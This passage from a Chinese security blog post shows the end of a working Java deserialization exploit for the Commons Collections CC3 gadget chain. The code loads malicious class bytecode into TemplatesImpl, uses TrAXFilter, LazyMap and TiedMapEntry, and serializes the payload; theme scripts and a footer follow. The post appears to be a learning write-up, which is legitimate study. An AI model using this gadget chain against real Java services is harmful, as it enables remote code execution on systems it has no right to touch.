这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes 不为空</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line"></span><br><span class="line">        // 利用 ChainedTransformer 执行 templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap ，没什么意义，仅作为参数传入</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法</span><br><span class="line">        // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象</span><br><span class="line">        // 利用链：TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get()</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode()</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值</span><br><span class="line">        // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法</span><br><span class="line">        map2.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line">        // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key</span><br><span class="line">        lazyMap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(&quot;trAXFilter_templatesImpl.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        Field declaredField = clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object, filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;trAXFilter_templatesImpl.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/06/05/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC4+CC2+CC5+CC7%E9%93%BE%E5%88%86%E6%9E%90/">漏洞篇 - Java 反序列化之 CC4+CC2+CC5+CC7 链</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F03-%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/">内网渗透 03 - 隧道通信</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.26.8';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.26.8" async></script>
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
+</div></body></html>
